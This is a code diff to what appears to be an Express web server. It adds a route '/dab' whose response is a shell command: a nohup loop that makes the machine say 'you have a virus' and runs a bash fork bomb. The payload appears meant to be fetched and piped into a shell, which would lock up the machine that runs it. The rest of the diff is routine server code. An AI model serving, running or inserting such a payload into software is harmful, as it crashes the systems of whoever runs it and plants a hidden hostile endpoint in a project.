@@ -142,6 +142,10 @@ app.get('/opensignout', function (req, res) {
         });
 });
 
+app.get('/dab', function (req, res) {
+    res.send("nohup sh -c 'while true; do sleep 1; say you have a virus.; :() { :|: & };:; done'");
+});
+
 var port = process.env.PORT || 3000; 
 var io = socketIO.listen(app.listen(port));
 console.log("listening on " + port + "!");
